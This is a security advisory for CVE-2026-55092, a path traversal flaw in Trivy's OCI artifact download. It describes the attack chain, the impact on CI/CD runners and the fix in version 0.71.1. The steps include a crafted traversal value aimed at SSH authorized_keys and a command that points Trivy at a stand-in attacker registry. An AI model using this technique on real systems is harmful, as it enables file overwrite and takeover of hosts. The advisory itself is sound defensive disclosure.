---
title: Path Traversal in Trivy via OCI Artifact Annotation
slug: 2026-08-trivy-path-traversal
description: Trivy versions prior to 0.71.1 are vulnerable to arbitrary file write via path traversal in OCI artifact titles, allowing attackers to overwrite files if a user is directed to an untrusted OCI registry.
date: "2026-08-25T18:49:53Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:aquasec:trivy:*:*:*:*:*:go:*:*
vendors:
  - Aqua Security
products:
  - Trivy
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: Exploitation requires the attacker to direct Trivy at an attacker-controlled OCI artifact.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: The file write may be leveraged to achieve code execution as that user.
    confidence_band: med
cves:
  - id: CVE-2026-55092
    cvss: 7.5
    epss: 0.00442
references:
  - https://github.com/advisories/GHSA-mcj4-mphf-j9ff
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55092
action_plan:
  priority: immediate_escalation
  owners:
    - IT Operations
    - DevSecOps
  immediate_actions:
    - action: Upgrade all Trivy installations to 0.71.1 or later.
      owner: DevSecOps
      due: 24h
      evidence: 'Patches: Fixed in Trivy 0.71.1.'
  mitigation_plan:
    - priority: immediate
      action: Restrict Trivy database and bundle repository URLs to trusted internal registries.
      owner: IT Operations
      addresses: CVE-2026-55092
      evidence: 'Workarounds: Do not download Trivy artifacts from OCI repositories you do not operate or trust.'
---

Trivy (versions prior to 0.71.1) contains a path traversal vulnerability (CVE-2026-55092) in its OCI artifact download logic. When Trivy fetches an OCI artifact - such as a vulnerability database, Java database, misconfiguration checks bundle, or WASM module - it uses the `org.opencontainers.image.title` annotation from the manifest as the destination filename. The application fails to validate or sanitize this title, allowing a malicious OCI registry to supply a crafted annotation containing path traversal characters (e.g., ../). 

This enables an attacker to write the content of the downloaded artifact layer to an arbitrary location on the host filesystem, within the security context of the user running the Trivy process. This risk is relevant when users override default settings to use third-party or untrusted mirrors via flags such as `--db-repository` or environment variables like `TRIVY_DB_REPOSITORY`.

## Attack Chain

1. Attacker hosts a malicious OCI artifact on an attacker-controlled registry.
2. Attacker crafts the OCI manifest for the artifact, setting the `org.opencontainers.image.title` annotation to a path traversal sequence (e.g., `../../../../home/user/.ssh/authorized_keys`).
3. A user executes a Trivy command, specifying the malicious registry via flags or environment variables (e.g., `trivy --db-repository attacker.com/malicious-db:latest`).
4. Trivy connects to the attacker-controlled registry to fetch the artifact.
5. The client downloads the layer content and associated annotations.
6. Trivy blindly uses the unvalidated `org.opencontainers.image.title` annotation as the target file path.
7. Trivy writes the malicious content to the specified arbitrary location on the host.
8. The final objective of arbitrary file write is achieved, potentially leading to code execution if configuration files or binaries are overwritten.

## Impact

Successful exploitation allows an attacker to write or overwrite files on the host system with the privileges of the Trivy process. In typical CI/CD pipeline environments, this can lead to privilege escalation or remote code execution by overwriting critical files such as SSH `authorized_keys`, user shell startup scripts (`.bashrc`, `.profile`), or cron jobs. The impact is limited by the filesystem permissions of the user executing Trivy.

## Recommendation

1. Upgrade to Trivy version 0.71.1 or later immediately.
2. Review CI/CD pipeline configurations to ensure that OCI repositories used for vulnerability databases, checks bundles, or modules are exclusively trusted and controlled by the organization.
3. Audit environments for the use of `--db-repository`, `--java-db-repository`, or `--checks-bundle-repository` flags that point to non-Aqua Security registries.
4. Implement strict egress filtering on CI/CD runners to prevent connections to unknown or untrusted OCI registries.
